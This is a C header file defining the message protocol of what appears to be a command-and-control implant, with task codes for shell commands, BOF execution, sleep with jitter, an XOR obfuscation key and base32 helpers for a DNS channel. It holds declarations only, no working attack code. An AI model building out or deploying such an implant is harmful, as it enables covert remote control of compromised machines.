#ifndef PROTOCOL_H
#define PROTOCOL_H

#include <windows.h>
#include <stdint.h>

#define MSG_REGISTER  0x01
#define MSG_HEARTBEAT 0x02
#define MSG_OUTPUT    0x03
#define MSG_BOF_OUT   0x04

#define RESP_IDLE     0x00
#define RESP_REG_ACK  0x01
#define RESP_TASKS    0x02
#define RESP_CONTINUE 0x03

#define CMD_SHELL       0x01
#define CMD_EXECUTE_BOF 0x02
#define CMD_SLEEP       0x03
#define CMD_TERMINATE   0x04

typedef struct {
    uint8_t  resp_type;
    uint8_t *data;
    uint16_t data_len;
} Response;

typedef struct {
    uint8_t  task_id[8];
    uint8_t  cmd_type;
    uint8_t *cmd_data;
    uint32_t cmd_data_len;
} Task;

extern uint32_t g_sleep_ms;
extern uint8_t  g_jitter_pct;
extern uint8_t  g_xor_key[4];
extern char     g_agent_id[9];

void     xor_crypt(uint8_t *data, size_t len);
uint16_t read_u16le(const uint8_t *b);
uint32_t read_u32le(const uint8_t *b);
void     write_u16le(uint8_t *b, uint16_t v);
void     write_u32le(uint8_t *b, uint32_t v);
void     sleep_jitter(void);

/* Base32 helpers (also used by dns.c) */
int base32_encode(const uint8_t *data, size_t len, char *out_buf, size_t out_size);
int base32_decode(const char *str, size_t str_len, uint8_t *out_buf, size_t out_size);

#endif
